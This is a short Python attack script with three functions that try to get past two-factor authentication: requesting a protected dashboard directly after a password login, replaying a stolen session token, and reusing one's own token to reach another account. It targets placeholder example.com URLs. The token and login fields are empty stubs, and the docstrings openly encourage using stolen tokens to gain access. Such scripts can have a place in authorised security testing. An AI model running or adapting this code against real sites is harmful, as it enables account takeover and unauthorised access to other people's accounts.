import requests

def direct_endpoint_access(login, mfa, dest):
    '''
    Check for direct endpoint access to bypass 2FA.
    '''
    session = requests.Session()
    login_page = session.get(login) # Generate CSRF token
    login_data = {} # Fill this with valid login data, including other fields like CSRF token if required, extract from login_page.

    login_response = session.post(login, data=login_data)
    if login_response.status_code == 200 and login_response.url != login:
        print("[+] Logged in succesfully!")
    else:
        print("[-] Login failed! Check login parameters again.")
        return

    headers = {
        'Referer': mfa,
        'User-Agent': 'Mozilla/5.0 (Direct-Access)',
        # Add any additionally required headers
    }
    try:
        destination = session.get(dest, headers=headers, allow_redirects=True, timeout=10)
        return {
            'status': destination.status_code,
            'url': destination.url,
            'redirects': len(destination.history),
            'text_snippet': destination.text
        }
    except requests.RequestException as e:
        return {'error': str(e)}
    
def stolen_token(token, dest):
    '''
    Chain vulnerabilities if you have a stolen session token use it to gain access!
    '''
    headers = {} # Add session token header used for authentication.
    session = requests.Session()
    try:
        destination = session.get(dest, headers=headers, allow_redirects=True, timeout=10)
        return {
            'status': destination.status_code,
            'url': destination.url,
            'redirects': len(destination.history),
            'text_snippet': destination.text
        }
    except requests.RequestException as e:
        return {'error': str(e)}
    
def unused_token(token, login):
    '''
    Similarly check if you can use your own valid token to entirely skip 2FA checks and gain access to some other account.
    '''
    headers = {} # Add session token header used for authentication
    payload = {} # Add any payload required for the login
    session = requests.Session()
    try:
        login_resp = session.post(login, headers=headers, allow_redirects=True, data=payload, timeout=10)
        return {
            'status': login_resp.status_code,
            'url': login_resp.url,
            'redirects': len(login_resp.history),
            'text_snippet': login_resp.text
        }
    except requests.RequestException as e:
        return {'error': str(e)}
    
# Calling all functions here:

direct_bypass = direct_endpoint_access(
    login="https://example.com/login",
    mfa="https://example.com/mfa",
    dest="https://example.com/dashboard"
)
if direct_bypass is not None: print(direct_bypass)

stolen_token_bypass = stolen_token(
    token="stolen_token_abc",
    dest="https://example.com/dashboard"
)
print(stolen_token_bypass)

unused_token_bypass = unused_token(
    token="your_unused_token_abc",
    login="https://example.com/login"
)
print(unused_token_bypass)